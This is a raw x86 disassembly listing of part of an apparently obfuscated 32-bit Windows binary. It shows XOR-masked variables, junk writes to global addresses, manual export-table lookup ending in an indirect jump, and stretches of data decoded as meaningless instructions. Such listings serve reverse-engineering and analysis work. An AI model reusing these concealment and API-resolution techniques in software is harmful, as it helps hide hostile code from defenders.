  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421e02
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x221390cd
  421d18:	ror    edi,0x38
  421d1b:	leave  
  421d1c:	sar    BYTE PTR [esi-0x4141418a],0xbe
  421d23:	imul   edx,esi,0xffffffc3
  421d26:	std    
  421d27:	jle    0x421d8b
  421d29:	retf   0x84c1
  421d2c:	(bad)  
  421d2d:	sub    bl,BYTE PTR [eiz*2+0x7c559473]
  421d34:	add    eax,0xb065f3c4
  421d39:	retf   
  421d3a:	gs sbb eax,ebx
  421d3d:	mov    cl,BYTE PTR [ebx-0x5d]
  421d40:	inc    BYTE PTR [ecx+0x66fbb99a]
  421d46:	mov    ecx,0x5a516f80
  421d4b:	je     0x421d36
  421d4d:	fcomp  st(5)
  421d4f:	cmp    cl,bl
  421d51:	fidivr DWORD PTR [esi+0x2c36766c]
  421d57:	clc    
  421d58:	xor    eax,0x5c3339a7
  421d5d:	fsub   DWORD PTR [ebp-0x7d]
  421d60:	dec    ebx
  421d61:	fnstcw WORD PTR [edx]
  421d63:	xchg   esi,eax
  421d64:	or     al,BYTE PTR [edi]
  421d66:	dec    esi
  421d67:	int3   
  421d68:	jl     0x421cf6
  421d6a:	xor    ebx,ebx
  421d6c:	jmp    0x19e7bbe8
  421d71:	dec    ecx
  421d72:	jmp    0x421d6f
  421d74:	call   0x44a99f6e
  421d79:	lods   eax,DWORD PTR ds:[esi]
  421d7a:	loop   0x421da9
  421d7c:	fisubr WORD PTR ds:[ecx-0x5b]
  421d80:	scas   al,BYTE PTR es:[edi]
  421d81:	mov    esp,0xe7ac4d2d
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	aas    
  421d88:	pop    ebp
  421d89:	xor    DWORD PTR [edi+0x2314397],esp
  421d8f:	int    0x5
  421d91:	or     cl,BYTE PTR [ebx-0x3d]
  421d94:	pushf  
  421d95:	shr    DWORD PTR [esi],1
  421d97:	push   esi
  421d98:	fs mov dl,0x38
  421d9b:	div    DWORD PTR [eax+edi*4+0x61]
  421d9f:	mov    edi,ebx
  421da1:	loopne 0x421ddf
  421da3:	mov    DWORD PTR [ecx-0x56],esp
  421da6:	xchg   ecx,eax
  421da7:	and    eax,0xc09d3a1a
  421dac:	mov    ebx,esp
  421dae:	addr16 pop ecx
  421db0:	inc    ebx
  421db1:	out    0xc2,eax
  421db3:	fstp   QWORD PTR ds:0xd76fc6b0
  421db9:	mov    al,0x53
  421dbb:	test   esp,0x4ac4653
  421dc1:	sub    al,0x59
  421dc3:	jmp    0x59f2:0x96ebabaf
  421dca:	cmp    dh,BYTE PTR [edi+0x2e0a76c]
  421dd0:	jl     0x421e2c
  421dd2:	sub    eax,0xf762b804
  421dd7:	ds push esp
  421dd9:	out    0x56,al
  421ddb:	ret    
  421ddc:	pop    esi
  421ddd:	and    ch,dh
  421ddf:	dec    esp
  421de0:	es add al,0x6
  421de3:	and    al,0x85
  421de5:	fldenv [esi+0x28]
  421de8:	add    al,BYTE PTR [esi+0x18]
  421deb:	inc    esi
  421dec:	xor    eax,0xd200379f
  421df1:	hlt    
  421df2:	pop    edi
  421df3:	not    BYTE PTR [esi+0x5d482a82]
  421df9:	or     dh,BYTE PTR [eax+0x4]
  421dfc:	retf   0x1a75
  421dff:	add    eax,0x858bb1d4
  421e04:	or     dh,bh
  421e06:	(bad)  
  421e07:	dec    DWORD PTR [ebx-0x20b73]
  421e0d:	dec    DWORD PTR [edi]
  421e0f:	mov    bh,0x4
  421e11:	xor    DWORD PTR ds:0xa59b,0xd1c0b70f
  421e1b:	clc    
  421e1c:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421e22:	mov    edx,DWORD PTR [ebp-0x20c]
  421e28:	movzx  ecx,WORD PTR [edx+ecx*4]
  421e2c:	xor    ecx,0xa59b
  421e32:	movzx  ecx,cx
  421e35:	shl    ecx,0xf
  421e38:	or     eax,ecx
  421e3a:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421e40:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421e47:	jmp    0x421879
  421e4c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e52:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e58:	xor    eax,0xcb79b576
  421e5d:	xor    edx,0x9c2b8ae8
  421e63:	mov    cl,0x2
  421e65:	call   0x408bb8
  421e6a:	mov    esi,eax
  421e6c:	mov    edi,edx
  421e6e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e74:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e7a:	xor    eax,0xcb79b576
  421e7f:	xor    edx,0x9c2b8ae8
  421e85:	mov    cl,0x3e
  421e87:	call   0x42241b
  421e8c:	or     esi,eax
  421e8e:	or     edi,edx
  421e90:	mov    DWORD PTR [ebp-0x1e4],esi
  421e96:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea2:	xor    eax,0xcb79b576
  421ea7:	xor    edx,0x9c2b8ae8
  421ead:	mov    cl,0x2
  421eaf:	call   0x408bb8
  421eb4:	mov    esi,eax
  421eb6:	mov    edi,edx
  421eb8:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ebe:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ec4:	xor    eax,0xcb79b576
  421ec9:	xor    edx,0x9c2b8ae8
  421ecf:	mov    cl,0x3e
  421ed1:	call   0x42241b
  421ed6:	or     esi,eax
  421ed8:	or     edi,edx
  421eda:	mov    DWORD PTR [ebp-0x23c],esi
  421ee0:	mov    DWORD PTR [ebp-0x238],edi
  421ee6:	mov    eax,DWORD PTR [ebp-0x23c]
  421eec:	or     eax,DWORD PTR [ebp-0x238]
  421ef2:	je     0x422152
  421ef8:	lea    eax,[ebp-0x204]
  421efe:	mov    DWORD PTR [ebp-0x208],eax
  421f04:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f0a:	xor    edx,edx
  421f0c:	mov    cl,0x2
  421f0e:	call   0x42241b
  421f13:	mov    esi,eax
  421f15:	mov    edi,edx
  421f17:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f1d:	xor    edx,edx
  421f1f:	mov    cl,0x3e
  421f21:	call   0x408bb8
  421f26:	or     esi,eax
  421f28:	or     edi,edx
  421f2a:	xor    esi,0xcb79b576
  421f30:	xor    edi,0x9c2b8ae8
  421f36:	mov    eax,DWORD PTR [ebp-0x208]
  421f3c:	mov    DWORD PTR [eax],esi
  421f3e:	mov    DWORD PTR [eax+0x4],edi
  421f41:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f47:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f4f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f55:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f5b:	xor    eax,0xcb79b576
  421f60:	xor    edx,0x9c2b8ae8
  421f66:	mov    cl,0x2
  421f68:	call   0x408bb8
  421f6d:	mov    ebx,eax
  421f6f:	mov    edi,edx
  421f71:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f77:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f7d:	xor    eax,0xcb79b576
  421f82:	xor    edx,0x9c2b8ae8
  421f88:	mov    cl,0x3e
  421f8a:	call   0x42241b
  421f8f:	or     ebx,eax
  421f91:	or     edi,edx
  421f93:	movsx  eax,bl
  421f96:	cmp    esi,eax
  421f98:	je     0x4220f8
  421f9e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421fa4:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421fac:	mov    eax,DWORD PTR [ebp-0x204]
  421fb2:	mov    edx,DWORD PTR [ebp-0x200]
  421fb8:	xor    eax,0xcb79b576
  421fbd:	xor    edx,0x9c2b8ae8
  421fc3:	mov    cl,0x2
  421fc5:	call   0x408bb8
  421fca:	mov    edi,eax
  421fcc:	mov    ebx,edx
  421fce:	mov    eax,DWORD PTR [ebp-0x204]
  421fd4:	mov    edx,DWORD PTR [ebp-0x200]
  421fda:	xor    eax,0xcb79b576
  421fdf:	xor    edx,0x9c2b8ae8
  421fe5:	mov    cl,0x3e
  421fe7:	call   0x42241b
  421fec:	or     edi,eax
  421fee:	or     ebx,edx
  421ff0:	mov    eax,DWORD PTR [ebp-0x210]
  421ff6:	movsx  eax,BYTE PTR [eax+edi*1]
  421ffa:	cmp    esi,eax
  421ffc:	je     0x42200c
  422002:	jmp    0x422152
  422007:	jmp    0x4220f8
  42200c:	mov    eax,DWORD PTR [ebp-0x204]
  422012:	mov    edx,DWORD PTR [ebp-0x200]
  422018:	xor    eax,0xcb79b576
  42201d:	xor    edx,0x9c2b8ae8
  422023:	mov    cl,0x2
  422025:	call   0x408bb8
  42202a:	mov    esi,eax
  42202c:	mov    edi,edx
  42202e:	mov    eax,DWORD PTR [ebp-0x204]
  422034:	mov    edx,DWORD PTR [ebp-0x200]
  42203a:	xor    eax,0xcb79b576
  42203f:	xor    edx,0x9c2b8ae8
  422045:	mov    cl,0x3e
  422047:	call   0x42241b
  42204c:	or     esi,eax
  42204e:	or     edi,edx
  422050:	mov    eax,DWORD PTR [ebp-0x210]
  422056:	movsx  esi,BYTE PTR [eax+esi*1]
  42205a:	mov    eax,DWORD PTR [ebp-0x1f0]
  422060:	mov    edx,DWORD PTR [ebp-0x1ec]
  422066:	xor    eax,0xcb79b576
  42206b:	xor    edx,0x9c2b8ae8
  422071:	mov    cl,0x2
  422073:	call   0x408bb8
  422078:	mov    ebx,eax
  42207a:	mov    edi,edx
  42207c:	mov    eax,DWORD PTR [ebp-0x1f0]
  422082:	mov    edx,DWORD PTR [ebp-0x1ec]
  422088:	xor    eax,0xcb79b576
  42208d:	xor    edx,0x9c2b8ae8
  422093:	mov    cl,0x3e
  422095:	call   0x42241b
  42209a:	or     ebx,eax
  42209c:	or     edi,edx
  42209e:	movsx  eax,bl
  4220a1:	cmp    esi,eax
  4220a3:	jne    0x4220f8
  4220a9:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220af:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220b5:	xor    eax,0xcb79b576
  4220ba:	xor    edx,0x9c2b8ae8
  4220c0:	mov    cl,0x2
  4220c2:	call   0x408bb8
  4220c7:	mov    esi,eax
  4220c9:	mov    edi,edx
  4220cb:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220d1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220d7:	xor    eax,0xcb79b576
  4220dc:	xor    edx,0x9c2b8ae8
  4220e2:	mov    cl,0x3e
  4220e4:	call   0x42241b
  4220e9:	or     esi,eax
  4220eb:	or     edi,edx
  4220ed:	mov    DWORD PTR [ebp-0x214],esi
  4220f3:	jmp    0x42219c
  4220f8:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220fe:	mov    edx,DWORD PTR [ebp-0x1dc]
  422104:	xor    eax,0xcb79b576
  422109:	xor    edx,0x9c2b8ae8
  42210f:	mov    cl,0x2
  422111:	call   0x408bb8
  422116:	mov    esi,eax
  422118:	mov    edi,edx
  42211a:	mov    eax,DWORD PTR [ebp-0x1e0]
  422120:	mov    edx,DWORD PTR [ebp-0x1dc]
  422126:	xor    eax,0xcb79b576
  42212b:	xor    edx,0x9c2b8ae8
  422131:	mov    cl,0x3e
  422133:	call   0x42241b
  422138:	or     esi,eax
  42213a:	or     edi,edx
  42213c:	add    esi,DWORD PTR [ebp-0x1e4]
  422142:	mov    DWORD PTR [ebp-0x1e4],esi
  422148:	jmp    0x421e96
  42214d:	jmp    0x421e96
  422152:	mov    eax,DWORD PTR [ebp-0x1f0]
  422158:	mov    edx,DWORD PTR [ebp-0x1ec]
  42215e:	xor    eax,0xcb79b576
  422163:	xor    edx,0x9c2b8ae8
  422169:	mov    cl,0x2
  42216b:	call   0x408bb8
  422170:	mov    esi,eax
  422172:	mov    edi,edx
  422174:	mov    eax,DWORD PTR [ebp-0x1f0]
  42217a:	mov    edx,DWORD PTR [ebp-0x1ec]
  422180:	xor    eax,0xcb79b576
  422185:	xor    edx,0x9c2b8ae8
  42218b:	mov    cl,0x3e
  42218d:	call   0x42241b
  422192:	or     esi,eax
  422194:	or     edi,edx
  422196:	mov    DWORD PTR [ebp-0x214],esi
  42219c:	mov    eax,DWORD PTR [ebp-0x214]
  4221a2:	mov    DWORD PTR [ebp-0xc8],eax
  4221a8:	cmp    DWORD PTR [ebp-0xc8],0x0
  4221af:	je     0x4221d9
  4221b5:	mov    eax,DWORD PTR [ebp-0x144]
  4221bb:	mov    ecx,DWORD PTR [ebp-0xac]
  4221c1:	movzx  eax,WORD PTR [ecx+eax*2]
  4221c5:	mov    ecx,DWORD PTR [ebp-0xa8]
  4221cb:	mov    eax,DWORD PTR [ecx+eax*4]
  4221ce:	mov    DWORD PTR [ebp-0xfc],eax
  4221d4:	jmp    0x4221de
  4221d9:	jmp    0x420789
  4221de:	cmp    DWORD PTR [ebp-0xfc],0x0
  4221e5:	jne    0x4221f2
  4221eb:	xor    eax,eax
  4221ed:	jmp    0x422414
  4221f2:	mov    eax,DWORD PTR [ebp+0x8]
  4221f5:	add    eax,DWORD PTR [ebp-0xfc]
  4221fb:	mov    DWORD PTR [ebp-0xec],eax
  422201:	mov    DWORD PTR [ebp-0x74],0x0
  422208:	cmp    DWORD PTR [ebp-0xb0],0x0
  42220f:	je     0x42228b
  422215:	cmp    DWORD PTR [ebp-0xb0],0x0
  42221c:	je     0x42228b
  422222:	mov    eax,DWORD PTR [ebp-0xb0]
  422228:	shl    eax,0x2
  42222b:	mov    DWORD PTR [ebp-0x74],eax
  42222e:	mov    DWORD PTR [ebp-0x14c],0x0
  422238:	sub    esp,DWORD PTR [ebp-0x74]
  42223b:	mov    DWORD PTR [ebp-0x14c],esp
  422241:	mov    DWORD PTR [ebp-0x148],0x0
  42224b:	mov    eax,DWORD PTR [ebp-0x148]
  422251:	cmp    eax,DWORD PTR [ebp-0xb0]
  422257:	je     0x42228b
  42225d:	mov    eax,DWORD PTR [ebp-0x148]
  422263:	mov    ecx,DWORD PTR [ebp-0x14c]
  422269:	mov    edx,DWORD PTR [ebp-0x148]
  42226f:	mov    esi,DWORD PTR [ebp+0x14]
  422272:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422276:	mov    DWORD PTR [ecx+eax*4],edx
  422279:	mov    eax,DWORD PTR [ebp-0x148]
  42227f:	inc    eax
  422280:	mov    DWORD PTR [ebp-0x148],eax
  422286:	jmp    0x42224b
  42228b:	mov    DWORD PTR [ebp-0x9c],0x0
  422295:	push   0x4223cd
  42229a:	jmp    DWORD PTR [ebp-0xec]
  4222a0:	mov    eax,eax
  4222a2:	mov    ecx,esp
  4222a4:	ret    0x8
  4222a7:	cmp    DWORD PTR ds:0x428425,0x0
  4222ae:	not    DWORD PTR ds:0x428425
  4222b4:	mov    DWORD PTR ds:0x42843d,0x5307
  4222be:	mov    DWORD PTR ds:0x428595,0x4819
  4222c8:	jmp    0x42230a
  4222cd:	not    eax
  4222cf:	cmp    DWORD PTR ds:0x428425,0x0
  4222d6:	jl     0x4222f8
  4222dc:	push   0x0
  4222de:	call   DWORD PTR ds:0x42e13c
  4222e4:	add    DWORD PTR ds:0x428515,0x4c21
  4222ee:	and    DWORD PTR ds:0x4284fd,0x73e0
  4222f8:	sub    DWORD PTR ds:0x428469,edx
  4222fe:	or     DWORD PTR ds:0x428371,ecx
  422304:	sub    DWORD PTR ds:0x42850d,ebx
  42230a:	push   ebx
  42230b:	dec    eax
  42230c:	push   esi
  42230d:	mov    eax,DWORD PTR [esp+0x18]
  422311:	or     eax,eax
  422313:	mov    DWORD PTR ds:0x42842d,0x72ef
  42231d:	jne    0x422359
  422323:	mov    ecx,DWORD PTR [esp+0x14]
  422327:	mov    eax,DWORD PTR [esp+0x10]
  42232b:	xor    edx,edx
  42232d:	inc    ebx
  42232e:	div    ecx
  422330:	sbb    ebx,DWORD PTR ds:0x428579
  422336:	mov    ebx,eax
  422338:	mov    eax,DWORD PTR [esp+0xc]
  42233c:	adc    DWORD PTR ds:0x4284fd,0x42848d
  422346:	div    ecx
  422348:	mov    DWORD PTR ds:0x428425,0x3a7e
  422352:	mov    edx,ebx
  422354:	jmp    0x4223c8
  422359:	mov    ecx,eax
  42235b:	mov    ebx,DWORD PTR [esp+0x14]
  42235f:	xor    eax,DWORD PTR ds:0x428599
  422365:	mov    edx,DWORD PTR [esp+0x10]
  422369:	mov    eax,DWORD PTR [esp+0xc]
  42236d:	mov    DWORD PTR ds:0x428495,0x7dde
  422377:	shr    ecx,1
  422379:	mov    DWORD PTR ds:0x428585,0x121c
  422383:	rcr    ebx,1
  422385:	shr    edx,1
  422387:	rcr    eax,1
  422389:	or     ecx,ecx
  42238b:	jne    0x42236d
  422391:	div    ebx
  422393:	mov    esi,eax
  422395:	mul    DWORD PTR [esp+0x18]
  422399:	mov    ecx,eax
  42239b:	mov    eax,DWORD PTR [esp+0x14]
  42239f:	mul    esi
  4223a1:	add    edx,ecx
  4223a3:	jb     0x4223c3
  4223a9:	cmp    edx,DWORD PTR [esp+0x10]
  4223ad:	ja     0x4223c3
  4223b3:	jb     0x4223c4
  4223b9:	cmp    eax,DWORD PTR [esp+0xc]
  4223bd:	jbe    0x4223c4
  4223c3:	dec    esi
  4223c4:	xor    edx,edx
  4223c6:	mov    eax,esi
  4223c8:	pop    esi
  4223c9:	pop    ebx
  4223ca:	ret    0x10
  4223cd:	sub    DWORD PTR [ebp+0x10],0x1
  4223d1:	mov    DWORD PTR ds:0x428501,0x3767
  4223db:	cmp    DWORD PTR [ebp+0x10],0x0
  4223df:	mov    DWORD PTR ds:0x428589,0xcef
  4223e9:	je     0x4223fe
  4223ef:	mov    esi,DWORD PTR ds:0x428519
  4223f5:	sbb    DWORD PTR ds:0x428585,esi
  4223fb:	add    esp,DWORD PTR [ebp-0x74]
  4223fe:	mov    DWORD PTR [ebp-0x9c],eax
  422404:	mov    eax,DWORD PTR [ebp-0x9c]
  42240a:	mov    DWORD PTR ds:0x428451,0x5e8f
  422414:	pop    edi
  422415:	pop    esi
  422416:	pop    ebx
  422417:	leave  
  422418:	ret    0x10
  42241b:	cmp    cl,0x40
  42241e:	mov    DWORD PTR ds:0x428455,0x7c93
  422428:	jae    0x422468
  42242e:	cmp    cl,0x20
  422431:	mov    DWORD PTR ds:0x428391,0x440e
  42243b:	jae    0x422447
  422441:	shld   edx,eax,cl
  422444:	shl    eax,cl
  422446:	ret    
  422447:	movzx  edx,WORD PTR ds:0x4284e5
  42244e:	add    DWORD PTR ds:0x428495,edx
  422454:	mov    edx,eax
  422456:	xor    eax,eax
  422458:	mov    DWORD PTR ds:0x428381,0x5f4f
  422462:	and    cl,0x1f
  422465:	shl    edx,cl
  422467:	ret    
  422468:	xor    eax,eax
  42246a:	xor    edx,edx
  42246c:	ret    
  42246d:	add    BYTE PTR [eax],al
  42246f:	add    BYTE PTR [ebx+esi*2],al
  422472:	xchg   ecx,ebp
  422474:	push   ebx
  422475:	into   
  422476:	jns    0x4224d9
  422478:	push   0x98626f72
  42247d:	xor    eax,0x74b9d761
  422482:	jne    0x4224f2
  422484:	and    dl,bl
  422486:	mov    ch,0xed
  422488:	popf   
  422489:	bnd ret 0xa4
  42248d:	add    BYTE PTR [eax],al
  42248f:	add    BYTE PTR [edi+0x72],ah
  422492:	gs popa 
  422494:	je     0x4224fd
  422496:	jb     0x4224fd
  422498:	popa   
  422499:	je     0x422502
  42249b:	jb     0x422502
  42249d:	popa   
  42249e:	je     0x422507
  4224a0:	jb     0x422507
  4224a2:	popa   
  4224a3:	je     0x42250c
  4224a5:	jb     0x42250c
  4224a7:	popa   
  4224a8:	je     0x422511
  4224aa:	jb     0x422511
  4224ac:	popa   
  4224ad:	je     0x422516
  4224af:	jb     0x422516
  4224b1:	popa   
  4224b2:	je     0x42251b
  4224b4:	jb     0x42251b
  4224b6:	popa   
  4224b7:	je     0x422520
  4224b9:	jb     0x422520
  4224bb:	popa   
  4224bc:	je     0x422525
  4224be:	jb     0x422525
  4224c0:	popa   
  4224c1:	je     0x4224c3
  4224c3:	add    BYTE PTR [eax+0x65],ch
  4224c6:	ins    BYTE PTR es:[edi],dx
  4224c7:	ins    BYTE PTR es:[edi],dx
  4224c8:	push   0x686c6c65
  4224cd:	gs ins BYTE PTR es:[edi],dx
  4224cf:	ins    BYTE PTR es:[edi],dx
  4224d0:	push   0x686c6c65
  4224d5:	gs ins BYTE PTR es:[edi],dx
  4224d7:	ins    BYTE PTR es:[edi],dx
  4224d8:	push   0x686c6c65
  4224dd:	gs ins BYTE PTR es:[edi],dx
  4224df:	ins    BYTE PTR es:[edi],dx
  4224e0:	push   0x686c6c65
  4224e5:	gs ins BYTE PTR es:[edi],dx
  4224e7:	ins    BYTE PTR es:[edi],dx
  4224e8:	push   0x686c6c65
  4224ed:	gs ins BYTE PTR es:[edi],dx
  4224ef:	ins    BYTE PTR es:[edi],dx
  4224f0:	push   0x686c6c65
  4224f5:	gs ins BYTE PTR es:[edi],dx
  4224f7:	ins    BYTE PTR es:[edi],dx
  4224f8:	add    BYTE PTR [eax],al
  4224fa:	add    BYTE PTR [eax],al
  4224fc:	outs   dx,DWORD PTR ds:[esi]
  4224fd:	add    BYTE PTR [eax+eax*1+0x65],ch
  422501:	add    BYTE PTR [ecx+0x0],ah
  422504:	jne    0x422506
  422506:	je     0x422508
  422508:	xor    eax,DWORD PTR [eax]
  42250a:	xor    al,BYTE PTR [eax]
  42250c:	add    BYTE PTR [eax],al
  42250e:	add    BYTE PTR [eax],al
  422510:	push   0x61006500
  422515:	add    BYTE PTR [esi+0x0],dh
  422518:	add    BYTE PTR gs:[esi+0x0],ch
  42251c:	push   0x61006500
  422521:	add    BYTE PTR [esi+0x0],dh
  422524:	add    BYTE PTR gs:[esi+0x0],ch
  422528:	push   0x61006500
  42252d:	add    BYTE PTR [esi+0x0],dh
  422530:	add    BYTE PTR gs:[esi+0x0],ch
  422534:	push   0x61006500
  422539:	add    BYTE PTR [esi+0x0],dh
  42253c:	add    BYTE PTR gs:[esi+0x0],ch
  422540:	push   0x61006500
  422545:	add    BYTE PTR [esi+0x0],dh
  422548:	add    BYTE PTR gs:[esi+0x0],ch
  42254c:	push   0x61006500
  422551:	add    BYTE PTR [esi+0x0],dh
  422554:	add    BYTE PTR gs:[esi+0x0],ch
  422558:	push   0x61006500
  42255d:	add    BYTE PTR [esi+0x0],dh
  422560:	add    BYTE PTR gs:[esi+0x0],ch
  422564:	push   0x61006500
  422569:	add    BYTE PTR [esi+0x0],dh
  42256c:	add    BYTE PTR gs:[esi+0x0],ch
  422570:	push   0x61006500
  422575:	add    BYTE PTR [esi+0x0],dh
  422578:	add    BYTE PTR gs:[esi+0x0],ch
  42257c:	add    BYTE PTR [eax],al
  42257e:	add    BYTE PTR [eax],al
  422580:	cld    
  422581:	and    al,0x42
  422583:	add    BYTE PTR [edi+0x6c],cl
  422586:	gs dec ecx
  422588:	arpl   WORD PTR [edi+0x6e],bp
  42258b:	push   esp
  42258c:	outs   dx,DWORD PTR ds:[esi]
  42258d:	inc    ebx
  42258e:	jne    0x422602
  422590:	jae    0x422601
  422592:	jb     0x422594
  422594:	test   BYTE PTR ds:0x42,ah
  42259a:	add    BYTE PTR [eax],al
  42259c:	add    BYTE PTR [eax],al
  42259e:	add    BYTE PTR [eax],al
  4225a0:	inc    eax
  4225a1:	sub    DWORD PTR [edx+0x0],eax
  4225a4:	dec    eax
  4225a5:	sub    DWORD PTR [edx+0x0],eax
  4225a8:	add    BYTE PTR [eax],ch
  4225aa:	inc    edx
  4225ab:	add    dl,dh
  4225ad:	inc    edx
  4225ae:	push   ebx
  4225af:	lea    edx,ds:0x1a59ba5
  4225b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b6:	popf   
  4225b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b8:	jno    0x42255f
  4225ba:	xchg   edi,eax
  4225bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225bc:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225c2:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  4225c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ca:	mov    ebx,0xd183d3a5
  4225cf:	lea    edx,[ebp-0x645aea5b]
  4225d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d6:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  4225dc:	xchg   edi,eax
  4225dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225de:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225e4:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  4225eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ec:	mov    ebx,0xd1e3d3a5
  4225f1:	in     eax,dx
  4225f2:	xchg   ebp,eax
  4225f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f4:	adc    eax,0x3ba59ba5
  4225f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fa:	popf   
  4225fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fc:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  422602:	(bad)  
  422603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422604:	fwait
  422605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422606:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  42260c:	icebp  
  42260d:	sub    eax,0xf172ff7
  422612:	adc    eax,0x3a59109
  422617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422618:	fwait
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422620:	xchg   ebp,eax
  422621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422622:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  422628:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  42262f:	or     eax,0x6f170ff7
  422634:	adc    eax,0x3a59169
  422639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263a:	fwait
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422642:	xchg   ebp,eax
  422643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422644:	xor    eax,0x9ba58da5
  422649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264a:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  422651:	ins    DWORD PTR es:[edi],dx
  422652:	imul   DWORD PTR [edi+0x17]
  422655:	dec    edi
  422656:	adc    eax,0x37a59149
  42265b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265c:	fwait
  42265d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265e:	jae    0x422605
  422660:	popf   
  422661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422662:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  422668:	(bad)  
  422669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266a:	fwait
  42266b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266c:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422673:	dec    ebp
  422674:	test   DWORD PTR [edi+0x16],0x91a914af
  42267b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267c:	aaa    
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	fwait
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	jae    0x422627
  422682:	popf   
  422683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422684:	pop    ss
  422685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422686:	xchg   ebp,eax
  422687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422688:	push   ecx
  422689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422690:	rol    DWORD PTR [ebx-0x2f],cl
  422693:	dec    ebp
  422694:	lock lods eax,DWORD PTR ds:[esi]
  422696:	imul   BYTE PTR [edi-0x76eb70ea]
  42269c:	xchg   ecx,eax
  42269d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269e:	aaa    
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	fwait
  4226a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a2:	jae    0x422649
  4226a4:	popf   
  4226a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a6:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  4226ac:	(bad)  
  4226ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ae:	fwait
  4226af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b0:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  4226b6:	lock (bad) 
  4226b8:	test   BYTE PTR [edi-0x16eb10ea],0x91
  4226bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c0:	aaa    
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
